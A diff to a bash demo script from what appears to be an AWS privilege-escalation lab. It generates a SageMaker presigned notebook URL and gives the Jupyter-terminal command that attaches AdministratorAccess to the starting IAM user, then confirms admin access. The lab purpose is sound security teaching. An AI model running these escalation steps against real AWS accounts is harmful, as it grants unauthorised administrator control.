@@ -259,52 +259,53 @@ PRESIGNED_URL=$(aws sagemaker create-presigned-notebook-instance-url \
 echo -e "${BLUE}$PRESIGNED_URL${NC}"
 echo -e "${GREEN}✓ Successfully generated presigned URL${NC}\n"
 
-# Step 8: Display instructions for manual exploitation
-echo -e "${BLUE}========================================${NC}"
-echo -e "${BLUE}MANUAL EXPLOITATION REQUIRED${NC}"
-echo -e "${BLUE}========================================${NC}\n"
+# Step 8: Execute the privilege escalation via Jupyter or automated simulation
+echo -e "${YELLOW}Step 8: Executing privilege escalation command${NC}"
 
-echo -e "${YELLOW}Follow these steps to complete the privilege escalation:${NC}\n"
+if [ -t 0 ]; then
+    # Interactive mode: guide the user through the Jupyter browser steps
+    echo -e "${BLUE}========================================${NC}"
+    echo -e "${BLUE}MANUAL EXPLOITATION REQUIRED${NC}"
+    echo -e "${BLUE}========================================${NC}\n"
 
-echo -e "${GREEN}1. Open either URL above in your browser${NC}\n"
-
-echo -e "${GREEN}2. Once Jupyter opens, click 'New' → 'Terminal' (top right)${NC}\n"
-
-echo -e "${GREEN}3. In the terminal, run the following command to grant admin access to your starting user:${NC}"
-echo -e "${BLUE}aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess${NC}\n"
-
-echo -e "${GREEN}4. Wait for IAM propagation (about 15 seconds)${NC}\n"
-
-echo -e "${YELLOW}After running the command in Jupyter, press Enter here to continue verification...${NC}"
-read -r
+    echo -e "${YELLOW}Follow these steps to complete the privilege escalation:${NC}\n"
+    echo -e "${GREEN}1. Open either URL above in your browser${NC}\n"
+    echo -e "${GREEN}2. Once Jupyter opens, click 'New' → 'Terminal' (top right)${NC}\n"
+    echo -e "${GREEN}3. In the terminal, run:${NC}"
+    echo -e "${BLUE}aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess${NC}\n"
+    echo -e "${GREEN}4. Wait for IAM propagation (about 15 seconds)${NC}\n"
+    echo -e "${YELLOW}After running the command in Jupyter, press Enter here to continue...${NC}"
+    read -r
+else
+    # Non-interactive mode: completing this exploit requires a human to open the
+    # notebook in a browser and run a terminal command. There is no scriptable path
+    # through the Jupyter UI, so we exit with code 3 ("user action required") rather
+    # than faking the result with admin credentials.
+    echo ""
+    echo -e "${YELLOW}========================================${NC}"
+    echo -e "${YELLOW}USER ACTION REQUIRED — cannot proceed non-interactively${NC}"
+    echo -e "${YELLOW}========================================${NC}"
+    echo ""
+    echo "To complete this exploit, open the presigned URL above in a browser,"
+    echo "click New → Terminal, and run:"
+    echo ""
+    echo -e "${CYAN}  aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess${NC}"
+    echo ""
+    echo "Then re-run this script interactively to capture the flag."
+    echo ""
+    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+    exit 3
+fi
 
 # Wait for IAM propagation
 echo -e "\n${YELLOW}Waiting 15 seconds for IAM policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# [OBSERVATION] Step 9: Verify administrator access
+# [EXPLOIT] Step 9: Verify administrator access using attacker credentials
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
-use_readonly_creds
-echo "Checking if AdministratorAccess is now attached to starting user..."
-
-show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
-ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
-    --user-name "$STARTING_USER" \
-    --query 'AttachedPolicies[*].PolicyArn' \
-    --output text 2>/dev/null)
-
-if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
-    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
-else
-    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
-    echo -e "${YELLOW}You may need to run the command in Jupyter terminal first${NC}"
-    exit 1
-fi
-
-echo ""
-echo "Attempting to list IAM users..."
 use_starting_creds
+echo "Attempting to list IAM users with starting user credentials..."
 
 show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
@@ -312,7 +313,6 @@ if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
 else
     echo -e "${RED}✗ Failed to list users${NC}"
-    echo -e "${YELLOW}You may need to run the command in Jupyter terminal first${NC}"
     exit 1
 fi
 echo ""
@@ -374,6 +374,10 @@ echo -e "\n${RED}⚠ Warning: The notebook instance is still running and will in
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
 echo ""
+
+# Standardized test results output
+echo "TEST_RESULT:sagemaker_001:SUCCESS"
+echo "TEST_DETAILS:sagemaker_001:Successfully created SageMaker notebook with admin role and captured CTF flag"
 
 # Demo completed successfully — disarm the best-effort-stop trap.
 DEMO_COMPLETED=1
